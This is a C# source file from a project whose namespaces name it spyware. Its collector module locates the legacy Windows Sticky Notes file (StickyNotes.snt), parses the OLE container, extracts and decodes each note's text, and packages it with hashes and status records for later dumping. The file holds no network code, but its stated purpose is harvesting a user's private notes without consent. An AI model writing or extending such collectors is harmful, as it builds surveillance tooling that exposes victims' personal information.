using System.Text;
using System.Text.RegularExpressions;
using Spyware.Core.Configuration;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Core.Security;

namespace Spyware.Collectors.Notes;

/// <summary>
/// Sticky Notes clásico (`%APPDATA%\Microsoft\Sticky Notes\StickyNotes.snt`): un archivo
/// CFB/OLE con una secuencia por nota, llamada `Threshold&lt;N&gt;`, y el texto en UTF-16LE
/// terminado en NUL. Se leen los datos tal cual: la conversión a UTF-8 la hace el volcado.
/// </summary>
public static class SntFileReader
{
    private static readonly Regex NoteStream = new(@"^Threshold\d+$",
        RegexOptions.IgnoreCase | RegexOptions.Compiled);

    public static IReadOnlyList<NoteEvent> Read(string copyPath, string storeName,
                                                NotesSection config, ILog log)
    {
        if (!CompoundFile.HasSignature(copyPath))
            return [Failure(storeName, NoteStatus.Unsupported, "el archivo no es un CFB/OLE")];

        try
        {
            using CompoundFile file = CompoundFile.Open(copyPath);

            List<CompoundStream> streams = file.EnumerateStreams()
                .Where(stream => NoteStream.IsMatch(stream.Name))
                .OrderBy(stream => Order(stream.Name), StringComparer.Ordinal)
                .ToList();

            if (streams.Count == 0)
                return [Failure(storeName, NoteStatus.Unsupported, "sin secuencias Threshold<N>")];

            var notes = new List<NoteEvent>(streams.Count);
            int maxResults = Math.Max(1, config.MaxResultsPerRun);

            foreach (CompoundStream stream in streams.Take(maxResults))
            {
                byte[]? raw = file.ReadStream(stream.Name, Math.Max(1024, config.MaxTextLength * 2));

                if (raw is null || raw.Length == 0)
                {
                    notes.Add(new NoteEvent
                    {
                        Source = "sticky_legacy",
                        Store = storeName,
                        NoteId = stream.Name,
                        Status = NoteStatus.Corrupted,
                        FailureReason = "secuencia vacía"
                    });

                    continue;
                }

                string text = NoteText.Sanitize(DecodeText(raw));

                if (text.Length == 0)
                {
                    notes.Add(new NoteEvent
                    {
                        Source = "sticky_legacy",
                        Store = storeName,
                        NoteId = stream.Name,
                        Status = NoteStatus.Unsupported,
                        FailureReason = "sin texto UTF-16 legible"
                    });

                    continue;
                }

                text = NoteText.Truncate(text, config.MaxTextLength, out _);

                notes.Add(new NoteEvent
                {
                    Source = "sticky_legacy",
                    Store = storeName,
                    NoteId = stream.Name,
                    Text = text,
                    Format = "text",
                    Status = NoteStatus.Read,
                    Length = text.Length,
                    Hash = HashHelper.Sha256Hex(text)
                });
            }

            log.Info($"Sticky Notes clásico: {streams.Count} secuencias, {notes.Count(n => n.Text is not null)} notas leídas.");
            return notes;
        }
        catch (InvalidDataException ex)
        {
            log.Warn($"StickyNotes.snt ilegible: {ex.Message}");
            return [Failure(storeName, NoteStatus.Corrupted, ex.Message)];
        }
        catch (Exception ex)
        {
            log.Error("Fallo al leer StickyNotes.snt.", ex);
            return [Failure(storeName, NoteStatus.Corrupted, ex.GetType().Name)];
        }
    }

    /// <summary>
    /// El texto termina en NUL y después vienen bytes binarios de la aplicación: se copia
    /// hasta el primer NUL. Si eso no da nada (versiones con prefijos raros) se rescata el
    /// segmento imprimible más largo, criterio forense habitual con archivos `.snt`.
    /// </summary>
    public static string DecodeText(byte[] data)
    {
        var run = new StringBuilder();

        foreach (char character in EnumerateUtf16(data))
        {
            if (character == '\0') break;
            if (char.IsControl(character) && character is not ('\t' or '\n' or '\r')) break;

            run.Append(character);
        }

        if (run.Length > 0)
            return run.ToString();

        var current = new StringBuilder();
        string longest = string.Empty;

        foreach (char character in EnumerateUtf16(data))
        {
            if (!char.IsControl(character) && !char.IsSurrogate(character))
            {
                current.Append(character);
                continue;
            }

            if (current.Length > longest.Length) longest = current.ToString();
            current.Clear();
        }

        return current.Length > longest.Length ? current.ToString() : longest;
    }

    private static IEnumerable<char> EnumerateUtf16(byte[] data)
    {
        for (int offset = 0; offset + 1 < data.Length; offset += 2)
            yield return (char)(data[offset] | (data[offset + 1] << 8));
    }

    private static string Order(string streamName)
    {
        // Threshold10 viene después de Threshold9 en orden natural, no alfabético.
        string digits = new(streamName.Where(char.IsDigit).ToArray());

        return long.TryParse(digits, out long number)
            ? number.ToString("D10")
            : streamName;
    }

    private static NoteEvent Failure(string store, string status, string reason) =>
        new()
        {
            Source = "sticky_legacy",
            Store = store,
            Status = status,
            FailureReason = reason
        };
}
